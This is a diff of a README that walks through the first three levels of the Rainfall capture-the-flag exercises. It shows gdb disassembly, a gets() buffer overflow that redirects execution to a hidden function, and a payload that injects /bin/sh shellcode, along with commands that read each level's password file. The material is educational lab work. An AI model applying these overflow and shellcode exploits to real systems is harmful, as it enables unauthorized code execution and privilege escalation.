@@ -4,112 +4,168 @@
 
 ## Introduction
 
- This is the continuation of snow-crash...
- Each level presents a unique puzzle or exploit that you must solve to find a hidden flag and move on to the next challenge
- Whether you are a beginner or an experienced hacker, these exercises will test your problem-solving abilities and expand your knowledge in various aspects of cyber security.
+Welcome to **Rainfall**, the continuation of **snow-crash**, a series of hands-on challenges in cyber security. Each level presents a unique puzzle or exploit that you must solve to uncover a hidden flag and progress to the next challenge. Whether you're a beginner or an experienced hacker, these exercises are designed to sharpen your problem-solving skills and broaden your knowledge of various cyber security concepts.
 
 |<h1>Cyber Security</h1>|
 |-|
-| <img width=500px src=https://www.asylas.com/asylas/security-memes-our-year-end-humor-break/> |
+| <img width="500px" src="https://www.asylas.com/asylas/security-memes-our-year-end-humor-break/" alt="Cyber Security Meme"> |
+
+
+<details>
+<summary>Notes:</summary>
+
+Registers: Think of registers like small, very fast storage spaces inside the CPU. The key registers we’ll see here are:
+
+    ebp (Base Pointer): Used to mark the start of the current function’s stack frame (a region of memory for the function’s variables).
+    esp (Stack Pointer): Points to the top of the stack (a dynamic region of memory where temporary data is stored and managed).
+    eax, edx: General-purpose registers used for calculations and temporarily holding values.
+
+Stack: A stack is like a pile of plates. You can only add (push) or remove (pop) plates from the top. It’s used to keep track of function calls, local variables, and temporary data.
+
+Instructions: Assembly instructions are commands to the CPU. For example:
+
+    push: Places (stores) a value on the stack.
+    mov: Moves data from one place to another (e.g., from a register to memory or vice versa).
+    call: Jumps to another function.
+    ret: Returns from a function.
+</details>
 
 ---
 
-## ![Disassemble the memory](https://img.shields.io/badge/Level-0-blue) Disassemble the memory
+## ![Level 0](https://img.shields.io/badge/Level-0-blue) Disassemble the Memory
 
-![Disassemble the memory](https://img.shields.io/badge/Disassemble%20the%20memory-ASM-blue?style=for-the-badge&logo=lock)
+![Disassemble the Memory](https://img.shields.io/badge/Disassemble%20the%20memory-ASM-blue?style=for-the-badge&logo=lock)
 
-**Description:** In this level you have to dissasamble the memory where you will find that there is an execution which will allow you to see the password for the next level if the `cmp` is meet.
+**Description:** In this level, you need to disassemble the memory and identify an execution path that will reveal the password for the next level if the `cmp` condition is met.
 
-**Steps:**
-1. **Execute the debugger**
-   `gdb level0`
-   `disas main`
-   `0x08048ed4 <+20>:   call   0x8049710 <atoi>`
-   `>0x08048ed9 <+25>:  cmp    $0x1a7,%eax`
-2. **Convert the number to see what you need to compare == true**
-   `echo $((16#1a7)) // 423`
-3. Execute with the answer
-   `./level0 423`
-4. Show the password
-   `whoami // level1`
-   `cat /home/user/level1/.pass`
-   `exit`
+### Steps:
+1. **Load the Program into the Debugger**:
+   ```bash
+   gdb level0
+   disas main
+   ```
+   You'll see something like:
+   ```
+   0x08048ed4 <+20>:   call   0x8049710 <atoi>
+   >0x08048ed9 <+25>:  cmp    $0x1a7,%eax
+   ```
 
+2. **Convert the Comparison Value**:
+   ```bash
+   echo $((16#1a7)) # Output: 423
+   ```
 
-You will realize the last step (4.) it's repeated a lot throughout the whole project...
+3. **Run the Program with the Correct Input**:
+   ```bash
+   ./level0 423
+   ```
 
----
-
-## ![Buffer Overflow `gets()`](https://img.shields.io/badge/Level-1-green) Buffer Overflow `gets()`
-
-![Buffer Overflow `gets()`](https://img.shields.io/badge/Buffer%20Overflow%20gets()-clib-blue?style=for-the-badge&logo=lock)
-
-**Description:** After looking at the assembler code we can identify a buffer overflow vulnerability on the unsafe use of the `gets()` function which can allow us to call the function `run()` by overflowing the address of the get's destiny and thus affecting the stack frame call (putting the address of the function run to be executed after the `gets()` call)
-
-**Steps:**
-1. **Execute the debugger**
-   `i func // see the run function [0x08048444]`
-   `disas main`
-   `0x08048490 <+16>:   call   0x8048340 <gets@plt> // see the address of target 0x8048340`
-2. **Calculate how many bytes between the address of target and run function**
-   `echo $((0x08048490 - 0x08048444)) // 76 bytes`
-3. **Test the hypotesis**
-   `(python -c 'print("A" * 75)' | ./level1 // Nothing but input is not waiting, EOI received, must use the trick with cat -`
-   `(python -c 'print("A" * 75)'; cat -) | ./level1 // Nothing`
-   `(python -c 'print("A" * 76)'; cat -) | ./level1 // Illegal instruction (core dumped)`
-   `(python -c 'print("A" * 77)'; cat -) | ./level1 // Illegal instruction (core dumped)`
-   `(python -c 'print("A" * 78)'; cat -) | ./level1 // Segmentation fault (core dumped)`
-4. Get address of run
-   `objdump -d ./level1 | grep run // 08048444 <run>:`
-5. Setup the exploit
-   `(python -c 'print("A" * 76 + "\x44\x84\x04\x08")'; cat -) | ./level1`
-6. Show the password
-   `whoami // level1`
-   `cat /home/user/level2/.pass`
-   `exit`
+4. **Retrieve the Password**:
+   ```bash
+   whoami # level1
+   cat /home/user/level1/.pass
+   exit
+   ```
 
 ---
 
-## ![Shell Script exploit](https://img.shields.io/badge/Level-2-yellow) Shell Script exploit
+## ![Level 1](https://img.shields.io/badge/Level-1-green) Buffer Overflow with `gets()`
 
-Founded a buffer overflow vulnerability where we can inject a shell code which is going to execute `/bin/sh` to get access to the user.
+![Buffer Overflow](https://img.shields.io/badge/Buffer%20Overflow%20gets()-clib-blue?style=for-the-badge&logo=lock)
 
-The exploit is founded after careful investigation by looking at the binary assembly code. 
-We detect the function gets, which is used to populate the pointer to the variable which has a memory limit of X, then we can overflow this address to reach eip and point to the address where we store the shell-script... Simple right!?
+**Description:** This level features a buffer overflow vulnerability in the unsafe `gets()` function. By exploiting this vulnerability, you can overwrite the stack and call the hidden `run()` function.
+
+### Steps:
+1. **Analyze the Program**:
+   ```bash
+   gdb level1
+   i func # Look for 'run' function address (e.g., 0x08048444)
+   disas main
+   ```
+   You’ll see:
+   ```
+   0x08048490 <+16>:   call   0x8048340 <gets@plt>
+   ```
+
+2. **Calculate the Offset**:
+   ```bash
+   echo $((0x08048490 - 0x08048444)) # Output: 76 bytes
+   ```
+
+3. **Test the Buffer Overflow**:
+   ```bash
+   (python -c 'print("A" * 76)'; cat -) | ./level1
+   # Results in: Illegal instruction or segmentation fault
+   ```
+
+4. **Prepare the Exploit**:
+   - Find the `run` function address:
+     ```bash
+     objdump -d ./level1 | grep run
+     # Output: 08048444 <run>:
+     ```
+
+   - Execute the exploit:
+     ```bash
+     (python -c 'print("A" * 76 + "\x44\x84\x04\x08")'; cat -) | ./level1
+     ```
+
+5. **Retrieve the Password**:
+   ```bash
+   whoami # level2
+   cat /home/user/level2/.pass
+   exit
+   ```
 
 ---
-<!--
 
-## ![Name](https://img.shields.io/badge/Level-3-orange) Name
+## ![Level 2](https://img.shields.io/badge/Level-2-yellow) Shellcode Injection
+
+![Shellcode Injection](https://img.shields.io/badge/Shellcode-Injection-yellow?style=for-the-badge&logo=lock)
+
+**Description:** This level features a buffer overflow vulnerability where you can inject shellcode into a buffer and overwrite the return address to execute it. The shellcode spawns a shell, allowing access to the next level.
+
+### Steps:
+1. **Analyze the Program**:
+   ```bash
+   objdump -d ./level2
+   ```
+   Look for:
+   - Use of `gets()` to populate a buffer (e.g., 76 bytes on the stack).
+   - Vulnerable return address checks.
+
+2. **Prepare the Shellcode**:
+   - Example shellcode to spawn `/bin/sh`:
+     ```assembly
+     "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+     ```
+   - Shellcode length: **21 bytes**.
+
+3. **Craft the Exploit**:
+   - Fill the buffer with the shellcode, padding, and return address:
+     ```bash
+     (python -c 'print("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A" * (76 - 21 + 4) + "\x08\xa0\x04\x08")'; cat -) | ./level2
+     ```
+
+4. **Retrieve the Password**:
+   ```bash
+   whoami # level3
+   cat /home/user/level3/.pass
+   exit
+   ```
 
 ---
-
-## ![Name](https://img.shields.io/badge/Level-4-red) Name
-
----
-
-## ![Name](https://img.shields.io/badge/Level-5-purple) Name
-
----
-
-## ![Name](https://img.shields.io/badge/Level-6-pink) Name
-
----
-
-## ![Name](https://img.shields.io/badge/Level-7-lightblue) Name
-
----
-
-## ![Name](https://img.shields.io/badge/Level-8-teal) Name
-
----
-
-## ![Name](https://img.shields.io/badge/Level-9-cyan) Name
--->
 
 ## Conclusion
 
-Each level provided a unique opportunity to apply and expand our skills in cyber security.
+Rainfall challenges provide an engaging and hands-on way to learn about cyber security concepts such as:
+- Buffer overflows
+- Shellcode injection
+- Binary disassembly
+- Exploiting unsafe functions like `gets()`
 
+Each level builds on the previous one, allowing you to gradually deepen your understanding of these critical vulnerabilities and how to exploit or prevent them.
+
+Let’s continue breaking things responsibly and learning to build stronger systems!
 
 ---
